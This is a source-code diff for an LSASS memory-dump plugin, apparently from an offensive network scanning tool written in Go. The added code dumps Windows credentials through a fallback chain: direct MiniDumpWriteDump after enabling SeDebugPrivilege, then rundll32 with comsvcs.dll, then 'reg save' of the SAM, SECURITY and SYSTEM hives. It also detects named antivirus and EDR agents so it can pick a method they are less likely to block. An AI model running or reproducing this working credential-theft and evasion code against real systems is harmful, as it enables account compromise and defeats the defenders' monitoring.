@@ -7,8 +7,8 @@ import (
 	"errors"
 	"fmt"
 	"os"
+	"os/exec"
 	"path/filepath"
-	"runtime"
 	"strings"
 	"syscall"
 	"time"
@@ -82,134 +82,154 @@ func NewMiniDumpPlugin() *MiniDumpPlugin {
 	}
 }
 
-// Scan 执行内存转储 - 直接实现
+// Scan 执行凭据提取——降级链：直接dump → comsvcs.dll → reg save
 func (p *MiniDumpPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
 	_ = session.Config
 	_ = session.State
 	defer func() {
 		if r := recover(); r != nil {
-			common.LogError(i18n.Tr("minidump_panic", r))
+			session.LogError(i18n.Tr("minidump_panic", r))
 		}
 	}()
 
 	var output strings.Builder
 
-	output.WriteString("=== 进程内存转储 ===\n")
-	output.WriteString(fmt.Sprintf("平台: %s\n", runtime.GOOS))
-
-	// 加载系统DLL
-	if err := p.loadSystemDLLs(); err != nil {
-		output.WriteString(fmt.Sprintf("加载系统DLL失败: %v\n", err))
-		return &plugins.Result{
-			Success: false,
-			Output:  output.String(),
-			Error:   err,
-		}
-	}
-
 	// 检查管理员权限
 	if !p.isAdmin() {
-		output.WriteString("需要管理员权限才能执行内存转储\n")
-		return &plugins.Result{
-			Success: false,
-			Output:  output.String(),
-			Error:   errors.New("需要管理员权限"),
+		return &plugins.Result{Success: false, Output: i18n.GetText("minidump_admin_required") + "\n", Error: errors.New(i18n.GetText("minidump_admin_required"))}
+	}
+
+	if err := p.loadSystemDLLs(); err != nil {
+		return &plugins.Result{Success: false, Output: i18n.Tr("minidump_load_dll_failed", err) + "\n", Error: err}
+	}
+	defer p.releaseSystemDLLs()
+
+	pm := &ProcessManager{kernel32: p.kernel32, dbghelp: p.dbghelp, advapi32: p.advapi32}
+	avActive := p.isAVBlocking()
+
+	// 方式1：直接 MiniDumpWriteDump（无杀软时尝试）
+	if !avActive {
+		output.WriteString(i18n.GetText("minidump_try_direct") + "\n")
+		if ok := p.tryDirectDump(ctx, pm, &output, session); ok {
+			return &plugins.Result{Success: true, Type: plugins.ResultTypeService, Output: output.String()}
 		}
+	} else {
+		output.WriteString(i18n.GetText("minidump_av_skip_direct") + "\n")
 	}
 
-	output.WriteString("✓ 已确认具有管理员权限\n")
-
-	// 创建进程管理器
-	pm := &ProcessManager{
-		kernel32: p.kernel32,
-		dbghelp:  p.dbghelp,
-		advapi32: p.advapi32,
+	// 方式2：comsvcs.dll（系统签名DLL，部分杀软不拦截）
+	output.WriteString(i18n.GetText("minidump_try_comsvcs") + "\n")
+	if ok := p.tryComsvcsDump(pm, &output, session); ok {
+		return &plugins.Result{Success: true, Type: plugins.ResultTypeService, Output: output.String()}
 	}
 
-	// 查找lsass.exe进程
-	output.WriteString("正在查找lsass.exe进程...\n")
+	// 方式3：reg save 导出注册表 hive（离线破解，不碰 LSASS）
+	output.WriteString(i18n.GetText("minidump_try_regsave") + "\n")
+	if ok := p.tryRegSave(&output, session); ok {
+		return &plugins.Result{Success: true, Type: plugins.ResultTypeService, Output: output.String()}
+	}
+
+	output.WriteString(i18n.GetText("minidump_all_failed") + "\n")
+	return &plugins.Result{Success: false, Output: output.String(), Error: errors.New(i18n.GetText("minidump_all_methods_failed"))}
+}
+
+func (p *MiniDumpPlugin) tryDirectDump(ctx context.Context, pm *ProcessManager, output *strings.Builder, session *common.ScanSession) bool {
 	pid, err := pm.findProcess("lsass.exe")
 	if err != nil {
-		output.WriteString(fmt.Sprintf("查找lsass.exe失败: %v\n", err))
-		return &plugins.Result{
-			Success: false,
-			Output:  output.String(),
-			Error:   err,
-		}
+		output.WriteString(i18n.Tr("minidump_find_lsass_failed", err) + "\n")
+		return false
 	}
 
-	output.WriteString(fmt.Sprintf("✓ 找到lsass.exe进程, PID: %d\n", pid))
-
-	// 提升权限
-	output.WriteString("正在提升SeDebugPrivilege权限...\n")
 	if privErr := pm.elevatePrivileges(); privErr != nil {
-		output.WriteString(fmt.Sprintf("权限提升失败: %v (尝试继续执行)\n", privErr))
-	} else {
-		output.WriteString("✓ 权限提升成功\n")
+		output.WriteString(i18n.Tr("minidump_privilege_failed", privErr) + "\n")
+		return false
 	}
 
-	// 创建转储文件
 	outputPath := filepath.Join(".", fmt.Sprintf("lsass-%d.dmp", pid))
-	output.WriteString(fmt.Sprintf("准备创建转储文件: %s\n", outputPath))
-
-	// 执行转储
-	output.WriteString("开始执行内存转储...\n")
-
-	// 创建带超时的context
-	dumpCtx, cancel := context.WithTimeout(ctx, 120*time.Second)
+	dumpCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
 	defer cancel()
 
-	err = pm.dumpProcessWithTimeout(dumpCtx, pid, outputPath)
-	if err != nil {
-		output.WriteString(fmt.Sprintf("内存转储失败: %v\n", err))
-		// 创建错误信息文件
-		errorData := []byte(fmt.Sprintf("Memory dump failed for PID %d\nError: %v\nTimestamp: %s\n",
-			pid, err, time.Now().Format("2006-01-02 15:04:05")))
-		_ = os.WriteFile(outputPath, errorData, 0644)
+	if err := pm.dumpProcessWithTimeout(dumpCtx, pid, outputPath); err != nil {
+		output.WriteString(i18n.Tr("minidump_direct_failed", err) + "\n")
+		os.Remove(outputPath)
+		return false
+	}
 
-		return &plugins.Result{
-			Success: false,
-			Output:  output.String(),
-			Error:   err,
+	return p.reportSuccess(output, outputPath, i18n.GetText("minidump_method_direct"), session)
+}
+
+func (p *MiniDumpPlugin) tryComsvcsDump(pm *ProcessManager, output *strings.Builder, session *common.ScanSession) bool {
+	pid, err := pm.findProcess("lsass.exe")
+	if err != nil {
+		output.WriteString(i18n.Tr("minidump_find_lsass_failed", err) + "\n")
+		return false
+	}
+
+	_ = pm.elevatePrivileges()
+
+	outputPath := filepath.Join(".", fmt.Sprintf("lsass-%d.dmp", pid))
+	cmd := exec.Command("rundll32.exe", "C:\\Windows\\System32\\comsvcs.dll,", "MiniDump",
+		fmt.Sprintf("%d", pid), outputPath, "full")
+	if err := cmd.Run(); err != nil {
+		output.WriteString(i18n.Tr("minidump_comsvcs_failed", err) + "\n")
+		return false
+	}
+
+	return p.reportSuccess(output, outputPath, "comsvcs.dll", session)
+}
+
+func (p *MiniDumpPlugin) tryRegSave(output *strings.Builder, session *common.ScanSession) bool {
+	files := map[string]string{
+		"SAM":      filepath.Join(".", "sam.hiv"),
+		"SECURITY": filepath.Join(".", "security.hiv"),
+		"SYSTEM":   filepath.Join(".", "system.hiv"),
+	}
+
+	saved := 0
+	for hive, path := range files {
+		if err := exec.Command("reg", "save", fmt.Sprintf("HKLM\\%s", hive), path, "/y").Run(); err == nil {
+			if fi, err := os.Stat(path); err == nil {
+				output.WriteString(fmt.Sprintf("  ✓ %s → %s (%d bytes)\n", hive, path, fi.Size()))
+				saved++
+			}
+		} else {
+			output.WriteString(i18n.Tr("minidump_hive_export_failed", hive) + "\n")
 		}
 	}
 
-	// 获取文件信息
-	fileInfo, err := os.Stat(outputPath)
-	var fileSize int64
-	if err == nil {
-		fileSize = fileInfo.Size()
+	if saved == 3 {
+		output.WriteString(i18n.GetText("minidump_regsave_done") + "\n")
+		session.LogSuccess(i18n.Tr("minidump_regsave_success"))
+		return true
 	}
+	return false
+}
 
-	output.WriteString("✓ 内存转储完成\n")
-	output.WriteString(fmt.Sprintf("转储文件: %s\n", outputPath))
-	output.WriteString(fmt.Sprintf("文件大小: %d bytes\n", fileSize))
-
-	common.LogSuccess(i18n.Tr("minidump_success", outputPath, fileSize))
-
-	return &plugins.Result{
-		Success: true,
-		Type:    plugins.ResultTypeService,
-		Output:  output.String(),
-		Error:   nil,
+func (p *MiniDumpPlugin) reportSuccess(output *strings.Builder, path, method string, session *common.ScanSession) bool {
+	fi, err := os.Stat(path)
+	if err != nil || fi.Size() == 0 {
+		return false
 	}
+	output.WriteString(i18n.Tr("minidump_method_success", method, path, fi.Size()) + "\n")
+	session.LogSuccess(i18n.Tr("minidump_success", path, fi.Size()))
+	return true
 }
 
 // loadSystemDLLs 加载系统DLL
 func (p *MiniDumpPlugin) loadSystemDLLs() error {
 	kernel32, err := syscall.LoadDLL("kernel32.dll")
 	if err != nil {
-		return fmt.Errorf("加载 kernel32.dll 失败: %w", err)
+		return fmt.Errorf("%s: %w", i18n.Tr("minidump_load_named_dll_failed", "kernel32.dll"), err)
 	}
 
 	dbghelp, err := syscall.LoadDLL("Dbghelp.dll")
 	if err != nil {
-		return fmt.Errorf("加载 Dbghelp.dll 失败: %w", err)
+		return fmt.Errorf("%s: %w", i18n.Tr("minidump_load_named_dll_failed", "Dbghelp.dll"), err)
 	}
 
 	advapi32, err := syscall.LoadDLL("advapi32.dll")
 	if err != nil {
-		return fmt.Errorf("加载 advapi32.dll 失败: %w", err)
+		return fmt.Errorf("%s: %w", i18n.Tr("minidump_load_named_dll_failed", "advapi32.dll"), err)
 	}
 
 	p.kernel32 = kernel32
@@ -217,6 +237,15 @@ func (p *MiniDumpPlugin) loadSystemDLLs() error {
 	p.advapi32 = advapi32
 
 	return nil
+}
+
+// releaseSystemDLLs 释放已加载的系统DLL
+func (p *MiniDumpPlugin) releaseSystemDLLs() {
+	for _, dll := range []*syscall.DLL{p.kernel32, p.dbghelp, p.advapi32} {
+		if dll != nil {
+			_ = dll.Release()
+		}
+	}
 }
 
 // isAdmin 检查是否具有管理员权限
@@ -256,14 +285,14 @@ func (pm *ProcessManager) findProcess(name string) (uint32, error) {
 func (pm *ProcessManager) createProcessSnapshot() (uintptr, error) {
 	proc, err := pm.kernel32.FindProc("CreateToolhelp32Snapshot")
 	if err != nil {
-		return 0, fmt.Errorf("查找CreateToolhelp32Snapshot函数失败: %w", err)
+		return 0, fmt.Errorf("%s: %w", i18n.Tr("minidump_find_proc_failed", "CreateToolhelp32Snapshot"), err)
 	}
 
 	handle, _, err := proc.Call(uintptr(TH32CS_SNAPPROCESS), 0)
 	if handle == uintptr(INVALID_HANDLE_VALUE) {
 		lastError := windows.GetLastError()
 		//nolint:errorlint // Windows LastError不应该wrapped
-		return 0, fmt.Errorf("创建进程快照失败: %v (LastError: %d)", err, lastError)
+		return 0, fmt.Errorf(i18n.GetText("minidump_snapshot_create_failed")+": %v (LastError: %d)", err, lastError)
 	}
 	return handle, nil
 }
@@ -275,29 +304,29 @@ func (pm *ProcessManager) findProcessInSnapshot(snapshot uintptr, name string) (
 
 	proc32First, err := pm.kernel32.FindProc("Process32FirstW")
 	if err != nil {
-		return 0, fmt.Errorf("查找Process32FirstW函数失败: %w", err)
+		return 0, fmt.Errorf("%s: %w", i18n.Tr("minidump_find_proc_failed", "Process32FirstW"), err)
 	}
 
 	proc32Next, err := pm.kernel32.FindProc("Process32NextW")
 	if err != nil {
-		return 0, fmt.Errorf("查找Process32NextW函数失败: %w", err)
+		return 0, fmt.Errorf("%s: %w", i18n.Tr("minidump_find_proc_failed", "Process32NextW"), err)
 	}
 
 	lstrcmpi, err := pm.kernel32.FindProc("lstrcmpiW")
 	if err != nil {
-		return 0, fmt.Errorf("查找lstrcmpiW函数失败: %w", err)
+		return 0, fmt.Errorf("%s: %w", i18n.Tr("minidump_find_proc_failed", "lstrcmpiW"), err)
 	}
 
 	ret, _, _ := proc32First.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
 	if ret == 0 {
 		//nolint:errorlint // Windows LastError不应该wrapped
-		return 0, fmt.Errorf("获取第一个进程失败 (LastError: %d)", windows.GetLastError())
+		return 0, fmt.Errorf(i18n.GetText("minidump_first_process_failed")+" (LastError: %d)", windows.GetLastError())
 	}
 
 	for {
 		namePtr, err := syscall.UTF16PtrFromString(name)
 		if err != nil {
-			return 0, fmt.Errorf("转换进程名失败: %w", err)
+			return 0, fmt.Errorf("%s: %w", i18n.GetText("minidump_process_name_convert_failed"), err)
 		}
 
 		ret, _, _ = lstrcmpi.Call(
@@ -315,7 +344,7 @@ func (pm *ProcessManager) findProcessInSnapshot(snapshot uintptr, name string) (
 		}
 	}
 
-	return 0, fmt.Errorf("未找到进程: %s", name)
+	return 0, fmt.Errorf("%s", i18n.Tr("minidump_process_not_found", name))
 }
 
 // elevatePrivileges 提升权限
@@ -328,7 +357,7 @@ func (pm *ProcessManager) elevatePrivileges() error {
 	var token syscall.Token
 	err = syscall.OpenProcessToken(handle, syscall.TOKEN_ADJUST_PRIVILEGES|syscall.TOKEN_QUERY, &token)
 	if err != nil {
-		return fmt.Errorf("打开进程令牌失败: %w", err)
+		return fmt.Errorf("%s: %w", i18n.GetText("minidump_open_process_token_failed"), err)
 	}
 	defer func() { _ = token.Close() }()
 
@@ -336,7 +365,7 @@ func (pm *ProcessManager) elevatePrivileges() error {
 
 	privilegeName, err := syscall.UTF16PtrFromString("SeDebugPrivilege")
 	if err != nil {
-		return fmt.Errorf("转换权限名称失败: %w", err)
+		return fmt.Errorf("%s: %w", i18n.GetText("minidump_privilege_name_convert_failed"), err)
 	}
 
 	lookupPrivilegeValue := pm.advapi32.MustFindProc("LookupPrivilegeValueW")
@@ -346,7 +375,7 @@ func (pm *ProcessManager) elevatePrivileges() error {
 		uintptr(unsafe.Pointer(&tokenPrivileges.Privileges[0].Luid)),
 	)
 	if ret == 0 {
-		return fmt.Errorf("查找特权值失败: %w", err)
+		return fmt.Errorf("%s: %w", i18n.GetText("minidump_lookup_privilege_failed"), err)
 	}
 
 	tokenPrivileges.PrivilegeCount = 1
@@ -360,7 +389,7 @@ func (pm *ProcessManager) elevatePrivileges() error {
 		0, 0, 0,
 	)
 	if ret == 0 {
-		return fmt.Errorf("调整令牌特权失败: %w", err)
+		return fmt.Errorf("%s: %w", i18n.GetText("minidump_adjust_token_failed"), err)
 	}
 
 	return nil
@@ -371,7 +400,7 @@ func (pm *ProcessManager) getCurrentProcess() (syscall.Handle, error) {
 	proc := pm.kernel32.MustFindProc("GetCurrentProcess")
 	handle, _, _ := proc.Call()
 	if handle == 0 {
-		return 0, fmt.Errorf("获取当前进程句柄失败")
+		return 0, fmt.Errorf("%s", i18n.GetText("minidump_current_process_failed"))
 	}
 	return syscall.Handle(handle), nil
 }
@@ -388,7 +417,7 @@ func (pm *ProcessManager) dumpProcessWithTimeout(ctx context.Context, pid uint32
 	case err := <-resultChan:
 		return err
 	case <-ctx.Done():
-		return fmt.Errorf("内存转储超时 (120秒)")
+		return fmt.Errorf("%s", i18n.GetText("minidump_timeout"))
 	}
 }
 
@@ -408,7 +437,7 @@ func (pm *ProcessManager) dumpProcess(pid uint32, outputPath string) error {
 
 	miniDumpWriteDump, err := pm.dbghelp.FindProc("MiniDumpWriteDump")
 	if err != nil {
-		return fmt.Errorf("查找MiniDumpWriteDump函数失败: %w", err)
+		return fmt.Errorf("%s: %w", i18n.Tr("minidump_find_proc_failed", "MiniDumpWriteDump"), err)
 	}
 
 	// 转储类型标志
@@ -451,7 +480,7 @@ func (pm *ProcessManager) dumpProcess(pid uint32, outputPath string) error {
 
 		if ret == 0 {
 			//nolint:errorlint // Windows LastError不应该wrapped
-			return fmt.Errorf("写入转储文件失败 (LastError: %d)", windows.GetLastError())
+			return fmt.Errorf(i18n.GetText("minidump_write_dump_failed")+" (LastError: %d)", windows.GetLastError())
 		}
 	}
 
@@ -462,14 +491,14 @@ func (pm *ProcessManager) dumpProcess(pid uint32, outputPath string) error {
 func (pm *ProcessManager) openProcess(pid uint32) (uintptr, error) {
 	proc, err := pm.kernel32.FindProc("OpenProcess")
 	if err != nil {
-		return 0, fmt.Errorf("查找OpenProcess函数失败: %w", err)
+		return 0, fmt.Errorf("%s: %w", i18n.Tr("minidump_find_proc_failed", "OpenProcess"), err)
 	}
 
 	handle, _, callErr := proc.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
 	if handle == 0 {
 		lastError := windows.GetLastError()
 		//nolint:errorlint // Windows LastError不应该wrapped
-		return 0, fmt.Errorf("打开进程失败: %v (LastError: %d)", callErr, lastError)
+		return 0, fmt.Errorf(i18n.GetText("minidump_open_process_failed")+": %v (LastError: %d)", callErr, lastError)
 	}
 	return handle, nil
 }
@@ -483,7 +512,7 @@ func (pm *ProcessManager) createDumpFile(path string) (uintptr, error) {
 
 	createFile, err := pm.kernel32.FindProc("CreateFileW")
 	if err != nil {
-		return 0, fmt.Errorf("查找CreateFileW函数失败: %w", err)
+		return 0, fmt.Errorf("%s: %w", i18n.Tr("minidump_find_proc_failed", "CreateFileW"), err)
 	}
 
 	handle, _, callErr := createFile.Call(
@@ -498,7 +527,7 @@ func (pm *ProcessManager) createDumpFile(path string) (uintptr, error) {
 	if handle == INVALID_HANDLE_VALUE {
 		lastError := windows.GetLastError()
 		//nolint:errorlint // Windows LastError不应该wrapped
-		return 0, fmt.Errorf("创建文件失败: %v (LastError: %d)", callErr, lastError)
+		return 0, fmt.Errorf(i18n.GetText("file_create_failed")+": %v (LastError: %d)", callErr, lastError)
 	}
 
 	return handle, nil
@@ -509,6 +538,47 @@ func (pm *ProcessManager) closeHandle(handle uintptr) {
 	if proc, err := pm.kernel32.FindProc("CloseHandle"); err == nil {
 		_, _, _ = proc.Call(handle)
 	}
+}
+
+// isAVBlocking 检测是否有杀软会拦截 LSASS dump
+func (p *MiniDumpPlugin) isAVBlocking() bool {
+	avProcesses := []string{
+		"MsMpEng.exe", "MsSense.exe",
+		"CylanceSvc.exe",
+		"csfalconservice.exe",
+		"SentinelServiceHost.exe", "SentinelAgent.exe",
+		"xagt.exe",
+		"elastic-endpoint.exe",
+		"cb.exe", "CbDefense.exe",
+	}
+
+	snapshot, err := p.kernel32.FindProc("CreateToolhelp32Snapshot")
+	if err != nil {
+		return false
+	}
+	handle, _, _ := snapshot.Call(TH32CS_SNAPPROCESS, 0)
+	if handle == INVALID_HANDLE_VALUE {
+		return false
+	}
+	defer p.kernel32.MustFindProc("CloseHandle").Call(handle)
+
+	first, _ := p.kernel32.FindProc("Process32FirstW")
+	next, _ := p.kernel32.FindProc("Process32NextW")
+
+	var entry PROCESSENTRY32
+	entry.dwSize = uint32(unsafe.Sizeof(entry))
+
+	ret, _, _ := first.Call(handle, uintptr(unsafe.Pointer(&entry)))
+	for ret != 0 {
+		name := syscall.UTF16ToString(entry.szExeFile[:])
+		for _, av := range avProcesses {
+			if strings.EqualFold(name, av) {
+				return true
+			}
+		}
+		ret, _, _ = next.Call(handle, uintptr(unsafe.Pointer(&entry)))
+	}
+	return false
 }
 
 // 注册插件
